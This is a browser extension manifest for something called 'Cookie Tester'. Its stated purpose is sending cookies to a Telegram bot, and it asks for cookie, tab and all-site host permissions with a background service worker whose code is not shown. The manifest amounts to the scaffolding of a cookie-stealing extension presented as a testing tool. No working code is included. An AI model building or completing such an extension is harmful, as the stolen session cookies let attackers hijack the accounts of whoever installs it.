{
    "manifest_version": 3,
    "name": "Cookie Tester",
    "version": "1.0",
    "description": "Test cookies by sending them to a Telegram bot",
    "permissions": [
      "cookies",
      "tabs",
      "activeTab",
      "http://*/*",
      "https://*/*"
    ],
    "host_permissions": [
      "http://*/*",
      "https://*/*"
    ],
    "background": {
      "service_worker": "background.js"
    }
  }
  